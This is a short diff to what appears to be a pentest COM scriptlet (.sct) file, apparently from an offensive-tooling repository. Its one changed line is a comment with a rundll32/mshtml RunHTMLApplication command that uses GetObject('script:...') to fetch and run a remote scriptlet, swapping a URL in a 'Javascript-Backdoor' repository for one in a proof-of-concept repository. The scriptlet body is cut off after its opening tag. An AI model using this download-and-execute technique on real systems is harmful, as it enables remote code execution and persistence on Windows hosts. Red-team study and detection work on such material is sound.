@@ -4,7 +4,7 @@
 progid="Pentest"       
 classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
 <!-- Command -->
-<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test") -->
+<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/greycel/pocs/master/wbemcomn01") -->
 
 <script language="JScript">
  
